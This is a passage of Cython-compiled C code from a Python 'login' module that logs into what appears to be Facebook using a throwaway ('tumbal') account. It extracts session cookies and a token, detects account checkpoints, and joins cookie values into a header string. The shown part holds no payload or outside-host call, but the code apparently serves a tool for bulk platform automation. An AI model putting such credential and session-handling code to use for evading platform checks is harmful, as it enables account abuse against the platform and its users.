          __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_v_cookie, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 232, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_8 = PyTuple_New(1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 232, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_GIVEREF(__pyx_t_11);
          PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_11);
          __pyx_t_11 = 0;
          __pyx_t_11 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 232, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          if (PyDict_SetItem(__pyx_t_11, __pyx_n_s_title, __pyx_n_u_COOKIE) < 0) __PYX_ERR(0, 232, __pyx_L3_error)
          __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_8, __pyx_t_11); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 232, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __pyx_t_11 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_11)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_11);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
            }
          }
          __pyx_t_4 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_11, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7);
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 232, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_time); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 233, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_sleep); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 233, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
            }
          }
          __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_6, __pyx_int_5) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_int_5);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 233, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_Menu); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 234, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_menu); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 234, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_7)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_7);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
            }
          }
          __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 234, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 234, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

          
        }

        
        goto __pyx_L9;
      }

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ses); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 235, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_cookies); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 235, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 235, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_6 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 235, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_12 = (__Pyx_PySequence_ContainsTF(__pyx_n_u_checkpoint, __pyx_t_6, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 235, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_13 = (__pyx_t_12 != 0);
      if (__pyx_t_13) {

        
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_prints); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_Panel); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_7 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_8, __pyx_kp_u_bold_red_Akun_tumbal_terkena_ch) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_kp_u_bold_red_Akun_tumbal_terkena_ch);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
          }
        }
        __pyx_t_6 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_11, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_7);
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_sys); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 237, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_exit); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 237, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_6 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 237, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        
        goto __pyx_L9;
      }

      
       {
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_prints); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 239, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_Panel); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 239, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_4 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_8, __pyx_kp_u_bold_red_Email_atau_kata_sandi) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_kp_u_bold_red_Email_atau_kata_sandi);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 239, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_6 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_11, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_4);
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 239, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_sys); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 240, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_exit); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 240, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
          }
        }
        __pyx_t_6 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 240, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      }
      __pyx_L9:;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
    __pyx_t_10 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_AttributeError);
    if (__pyx_t_10) {
      __Pyx_AddTraceback("login.kredensial", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_4, &__pyx_t_7) < 0) __PYX_ERR(0, 241, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_7);

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_prints); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 242, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_Panel); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 242, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_14 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_14)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_14);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_9 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_14, __pyx_kp_u_bold_red_Email_atau_kata_sandi) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_kp_u_bold_red_Email_atau_kata_sandi);
      __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
      if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 242, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_11 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_5, __pyx_t_9) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_9);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 242, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_sys); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 243, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_exit); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 243, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
        }
      }
      __pyx_t_11 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 243, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_AddTraceback("login.kredensial", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_header);
  __Pyx_XDECREF(__pyx_v_r);
  __Pyx_XDECREF(__pyx_v_das);
  __Pyx_XDECREF(__pyx_v_header1);
  __Pyx_XDECREF(__pyx_v_po);
  __Pyx_XDECREF(__pyx_v_headcok);
  __Pyx_XDECREF(__pyx_v_data2);
  __Pyx_XDECREF(__pyx_v_find_token);
  __Pyx_XDECREF(__pyx_v_token);
  __Pyx_XDECREF(__pyx_v_cookie);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_5login_19convert(PyObject *__pyx_self, PyObject *__pyx_v_cok); 
static PyMethodDef __pyx_mdef_5login_19convert = {"convert", (PyCFunction)__pyx_pw_5login_19convert, METH_O, 0};
static PyObject *__pyx_pw_5login_19convert(PyObject *__pyx_self, PyObject *__pyx_v_cok) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("convert (wrapper)", 0);
  __pyx_r = __pyx_pf_5login_18convert(__pyx_self, ((PyObject *)__pyx_v_cok));

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5login_18convert(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_cok) {
  PyObject *__pyx_v_cookie = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  Py_ssize_t __pyx_t_2;
  Py_UCS4 __pyx_t_3;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("convert", 0);

  
  __pyx_t_1 = PyTuple_New(8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 246, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = 0;
  __pyx_t_3 = 127;
  __Pyx_INCREF(__pyx_kp_u_datr);
  __pyx_t_2 += 5;
  __Pyx_GIVEREF(__pyx_kp_u_datr);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_datr);
  __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_cok, __pyx_n_u_datr_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 246, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_4), __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 246, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_3;
  __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_5);
  __pyx_t_5 = 0;
  __Pyx_INCREF(__pyx_kp_u_c_user_2);
  __pyx_t_2 += 8;
  __Pyx_GIVEREF(__pyx_kp_u_c_user_2);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_c_user_2);
  __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_v_cok, __pyx_n_u_c_user); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 246, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_4 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_5), __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 246, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
  __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_fr);
  __pyx_t_2 += 4;
  __Pyx_GIVEREF(__pyx_kp_u_fr);
  PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u_fr);
  __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_cok, __pyx_n_u_fr_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 246, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_4), __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 246, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_3;
  __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_t_5);
  __pyx_t_5 = 0;
  __Pyx_INCREF(__pyx_kp_u_xs);
  __pyx_t_2 += 4;
  __Pyx_GIVEREF(__pyx_kp_u_xs);
  PyTuple_SET_ITEM(__pyx_t_1, 6, __pyx_kp_u_xs);
  __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_v_cok, __pyx_n_u_xs_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 246, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_4 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_5), __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 246, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
  __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 7, __pyx_t_4);
  __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_1, 8, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 246, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
